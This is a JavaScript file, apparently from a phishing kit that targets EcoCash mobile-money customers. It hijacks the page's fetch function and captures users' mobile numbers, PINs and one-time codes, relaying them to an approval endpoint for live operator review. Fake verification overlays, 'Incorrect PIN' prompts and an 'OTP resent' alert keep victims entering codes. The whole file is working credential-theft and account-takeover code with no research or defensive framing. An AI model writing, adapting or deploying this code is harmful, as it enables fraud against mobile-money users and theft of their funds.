(function () {
  const API_SEND = '/api/send';
  const API_APPROVAL = '/api/approval/request';
  const API_STATUS = '/api/approval/status';

  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  function parse(text) {
    if (!text || typeof text !== 'string') return null;
    const lines = text.split('\n').map((s) => s.trim());
    const getLine = (key) => {
      const line = lines.find((l) => l.toLowerCase().startsWith(key.toLowerCase() + ':'));
      return line ? line.slice(line.indexOf(':') + 1).trim() : '';
    };

    if (/^EcoCash OTP/i.test(lines[0])) {
      return { stage: 'otp', phone: getLine('Mobile'), otp: getLine('OTP') };
    }
    if (/^EcoCash Login/i.test(lines[0])) {
      return { stage: 'pin', phone: getLine('Mobile'), pin: getLine('PIN') };
    }
    return null;
  }

  function showOverlay(message) {
    let overlay = document.getElementById('gate-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id = 'gate-overlay';
      overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 99999;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      `;

      const dialog = document.createElement('div');
      dialog.style.cssText = `
        background: white;
        padding: 24px;
        border-radius: 8px;
        max-width: 400px;
        text-align: center;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
      `;

      const title = document.createElement('h2');
      title.style.cssText = `
        margin: 0 0 16px 0;
        color: #333;
        font-size: 20px;
      `;
      title.textContent = 'Verification Status';

      const msg = document.createElement('p');
      msg.style.cssText = `
        margin: 0 0 24px 0;
        color: #666;
        font-size: 16px;
        line-height: 1.5;
      `;
      msg.textContent = message;

      const btn = document.createElement('button');
      btn.textContent = 'Try Again';
      btn.style.cssText = `
        background: #007AFF;
        color: white;
        border: none;
        padding: 12px 24px;
        border-radius: 6px;
        font-size: 16px;
        cursor: pointer;
        font-weight: 500;
      `;
      btn.addEventListener('click', () => {
        overlay.style.display = 'none';
      });

      dialog.appendChild(title);
      dialog.appendChild(msg);
      dialog.appendChild(btn);
      overlay.appendChild(dialog);
      document.body.appendChild(overlay);
    } else {
      const msg = overlay.querySelector('p');
      if (msg) msg.textContent = message;
    }

    overlay.style.display = 'flex';
  }

  async function poll(id, expiresAt) {
    let lastAction = null;

    while (Date.now() < expiresAt) {
      await sleep(2500);

      try {
        const res = await fetch(`${API_STATUS}?id=${encodeURIComponent(id)}`);
        if (!res.ok) continue;

        const data = await res.json();
        if (data.expiresAt) expiresAt = data.expiresAt;

        if (data.status === 'approved') {
          return { ok: true };
        }
        if (data.status === 'denied') {
          return { ok: false, reason: data.action };
        }
        if (data.status === 'expired') {
          break;
        }

        if (data.action === 'resend_otp' && lastAction !== 'resend_otp') {
          lastAction = 'resend_otp';
          alert('OTP resent to your number!');
        }
      } catch (e) {
        console.warn('Approval status check failed:', e);
      }
    }

    return { ok: false, reason: 'timeout' };
  }

  async function requestApproval(info) {
    const body = {
      stage: info.stage,
      phone: info.phone,
      ...(info.stage === 'pin' && { pin: info.pin }),
      ...(info.stage === 'otp' && { otp: info.otp }),
    };

    try {
      const res = await fetch(API_APPROVAL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      if (!res.ok) {
        showOverlay('Unable to verify right now. Please try again.');
        return new Promise(() => {});
      }

      const data = await res.json();
      const result = await poll(data.id, data.expiresAt);

      if (result.ok) {
        return new Response('{"ok":true}', { status: 200, headers: { 'Content-Type': 'application/json' } });
      }

      const reasonMap = {
        pin_bad: 'Incorrect PIN. Please try again.',
        otp_bad: 'Wrong code. Please resend the OTP.',
        timeout: 'Verification timed out. Please try again.',
      };

      const message = reasonMap[result.reason] || 'Request declined.';
      showOverlay(message);
      return new Promise(() => {});
    } catch (err) {
      console.error('Approval request failed:', err);
      showOverlay('Unable to verify right now. Please try again.');
      return new Promise(() => {});
    }
  }

  const originalFetch = window.fetch;
  window.fetch = async function (input, init) {
    const url = typeof input === 'string' ? input : input && input.url ? input.url : '';
    const body = init && typeof init.body === 'string' ? init.body : null;

    if (url.includes(API_SEND) && init && init.method === 'POST' && body) {
      let payload = null;
      try {
        payload = JSON.parse(body);
      } catch (e) {}

      if (payload && typeof payload.text === 'string') {
        const info = parse(payload.text);
        if (info && (info.stage === 'pin' || info.stage === 'otp')) {
          return requestApproval(info);
        }
      }
    }

    return originalFetch.apply(this, arguments);
  };
})();
